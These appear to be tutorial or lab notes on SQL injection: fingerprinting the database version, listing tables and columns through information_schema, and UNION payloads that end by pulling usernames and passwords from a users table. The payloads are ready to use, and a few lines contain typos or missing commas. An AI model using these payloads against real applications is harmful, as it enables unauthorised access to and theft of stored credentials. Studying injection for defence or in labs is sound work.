To exploit SQL injections it's often necessary to know and find information about databases, this includes:
- The type and version of the database software
- The tables and columns the database contains

__Querying Database type and Version__
- It is possible to identify database type and version by injecting provider specific queries to see if one works, here are some queries

| Database Type    | Query                     |
| ---------------- | ------------------------- |
| Microsoft, MySQL | `SELECT @@version`        |
| Oracle           | `SELECT * FROM v$version` |
| PostgreSQL       | `SELECT version()`        |
- For example we can use a union attack with the following input
```
' UNION SELECT @@version--
```
- This might return the following output, and we may be able to confirm the database type and version
```
Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
Mar 18 2018 09:11:49
Copyright (c) Microsoft Corporation
Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
```
- Make sure to identify the number of columns and the ones which store string data before performing the `UNION` attack.


__Listing the contents of the Database__
- Most database types (except Oracle) have a set of views called the information schema, which provides information about the database.
- For example, you can query `information_schema.tables` to list the tables in the database.
```
SELECT * FROM information_schema.tables
```
- The output would look like this
```
TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE
=====================================================
MyDatabase    dbo          Products   BASE TABLE
MyDatabase    dbo          Users      BASE TABLE
MyDatabase    dbo          Feedback   BASE TABLE
```
- This output indicates that there are 3 tables `Products`, `Users` and `Feedback`.
- We can query `information_schema.columns` to list the columns in individual tables
```
SELET * FROM information_schema.columns WHERE table_name = 'Users' 
```
- This might return something like the following
```
TABLE_CATALOG TABLE_SCHEMA TABLE_NAME COLUMN_NAME DATA_TYPE
=================================================================
MyDatabase    dbo          Users      UserId      int
MyDatabase    dbo          Users      Username    varchar
MyDatabase    dbo          Users      Password    varchar
```

- The basic SQL injection to get table names in non Oracle databases is
```
'+UNION+SELECT+table_name,+NULL+NULL+....+FROM+information_schema.tables--
```
- Similarly to get column details
```
'+UNION+SELECT+column_name,+NULL+NULL+......+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
```
- and the final injection might look something like this
```
'+UNION+SELECT+username_chcmum,+password_yepgeh+FROM+users_iphhmf--
```

users_cxecmx
